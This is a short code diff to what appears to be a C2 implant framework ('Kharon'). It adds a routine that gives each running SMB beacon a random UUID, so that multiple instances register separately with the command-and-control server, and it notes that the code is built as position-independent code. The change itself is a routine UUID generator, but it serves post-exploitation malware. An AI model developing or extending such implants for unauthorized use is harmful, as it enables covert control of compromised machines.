@@ -49,6 +49,26 @@ auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID {
     Cfg->KillDate.Enabled    = KH_KILLDATE_ENABLED;
 
 #if PROFILE_C2 == PROFILE_SMB
+    // Generate a unique AgentId at runtime so multiple instances of the same
+    // binary get distinct identities. Without this, running smb.exe twice
+    // produces two beacons with the same UUID, and the server rejects the second.
+    {
+        ULONG seed = Self->Krnl32.GetTickCount();
+        PCHAR hexChars = (PCHAR)"0123456789abcdef";
+        PCHAR newUUID = (PCHAR)KhAlloc( 37 ); // 36 chars + null
+        ULONG pos = 0;
+        for ( ULONG i = 0; i < 36; i++ ) {
+            if ( i == 8 || i == 13 || i == 18 || i == 23 ) {
+                newUUID[pos++] = '-';
+            } else {
+                seed = Self->Ntdll.RtlRandomEx( &seed );
+                newUUID[pos++] = hexChars[seed % 16];
+            }
+        }
+        newUUID[36] = 0;
+        Cfg->AgentId = newUUID;
+    }
+
     // SMB pipe name as stack byte array (NOT static — .data section is stripped from PIC)
     BYTE smb_pipe_bytes[] = SMB_PIPE_NAME;
     // Copy to heap so it persists after GetConfig returns
